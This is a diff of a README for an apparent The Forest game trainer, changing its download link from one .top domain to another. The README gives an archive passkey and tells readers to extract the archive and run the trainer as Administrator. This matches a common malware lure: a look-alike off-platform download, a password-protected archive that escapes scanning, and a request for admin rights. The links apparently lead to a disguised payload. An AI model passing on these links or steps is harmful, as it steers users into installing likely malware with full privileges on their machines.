@@ -6,7 +6,7 @@ The Forest trainer with god mode, infinite health, stamina, food, water, and ite
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ Based on popular mods like **TrainerLib** and **Cheat Engine**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch The Forest.
 4. Run the trainer **as Administrator**.
